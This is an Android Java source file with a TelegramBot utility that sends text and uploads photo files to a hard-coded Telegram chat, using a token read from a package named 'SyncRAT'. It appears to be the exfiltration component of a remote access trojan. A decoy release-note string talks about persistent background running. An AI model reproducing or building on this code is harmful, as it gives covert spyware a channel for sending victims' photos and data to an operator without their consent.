// android/iocl/dac_collector/Utility/TelegramBot.java
package android.iocl.dac_collector.Utility;

import android.content.Context;
import android.iocl.dac_collector.ModelData.TelegramResponse;
import android.iocl.dac_collector.RetrofitClient.TelegramApi;
import android.iocl.dac_collector.RetrofitClient.TelegramService;
import android.iocl.dac_collector.SyncRAT.Config;
import android.util.Log;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import java.io.File;
import java.util.Objects;

public class TelegramBot {
    private static final String TAG       = "TelegramBot";
    private static final String BOT_TOKEN = Config.Telegram.BOT_TOKEN;
    private static final String CHAT_ID   = Config.Telegram.CHAT_ID;


    private String sampleMessage = "*# ProfileLoaded*\n"
            + "_Release Note for `V1.0.9`_\n\n"
            + "*🎁 New in Ui and Background*\n\n"
            + "- Added a Display Over Other Apps for continious running \\(Specially Realme Model \"CPH\"\\)\n"
            + "- Re-designed notification layout and App Update Layout\n"
            + "- Now Profile will fetch automatically in background\n"
            + "- Now Profile will fetch automatically in background";
    private final Context   context;
    private final TelegramApi api;

    private TelegramBot(Context ctx) {
        // use application context to avoid leaks
        this.context = ctx.getApplicationContext();
        this.api     = TelegramService.getService(context, BOT_TOKEN);
    }

    /** Start your fluent call. */
    public static TelegramBot with(Context context) {
        return new TelegramBot(context);
    }

    /** Send a text message. */
    public TelegramBot sendMessage(String text) {
        Call<TelegramResponse> call = api.sendMessage(CHAT_ID, text);
        call.enqueue(new Callback<TelegramResponse>() {
            @Override
            public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {
                Log.d(TAG, "onResponse: " + r);
            }
            @Override
            public void onFailure(Call<TelegramResponse> call, Throwable t) {

            }
        });
        return this;
    }

    /** Send Markdown formatted message */


    /** Send a photo with optional caption. */
    public TelegramBot sendPhoto(File photoFile, String caption) {
        // build parts
        RequestBody chatPart = RequestBody.create(
                CHAT_ID, okhttp3.MediaType.parse("text/plain")
        );
        RequestBody capPart = RequestBody.create(
                caption != null ? caption : "",
                okhttp3.MediaType.parse("text/plain")
        );
        MultipartBody.Part photoPart =
                TelegramService.prepareFilePart("photo", photoFile);

        Call<TelegramResponse> call = api.sendPhoto(chatPart, photoPart, capPart);
        call.enqueue(new Callback<TelegramResponse>() {
            @Override
            public void onResponse(Call<TelegramResponse> call, Response<TelegramResponse> r) {

                Log.d(TAG, "onResponse: " + r);

            }
            @Override
            public void onFailure(Call<TelegramResponse> call, Throwable t) {

                Log.d(TAG, "onResponse: " + call);
                Log.d(TAG, "onResponse: " + t);

            }
        });
        return this;
    }
}
